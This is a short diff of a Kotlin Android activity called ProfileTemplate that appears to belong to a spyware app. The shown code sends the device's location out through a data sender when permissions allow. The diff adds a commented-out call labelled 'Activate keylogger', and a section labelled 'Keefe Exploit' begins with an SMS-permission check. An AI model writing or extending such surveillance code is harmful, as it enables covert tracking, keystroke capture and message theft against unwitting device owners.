@@ -60,6 +60,7 @@ class ProfileTemplate : AppCompatActivity() {
         if (checkLocPerms(this, *PERMISSIONS)) {
             datasender.sendData("loc", gps.getLocationDetails())
         }
+        //gn.accessibilityCheck() //Activate keylogger
 
         // Keefe Exploit --------------------------------------------------------------
         if (checkSMSPerms()) {
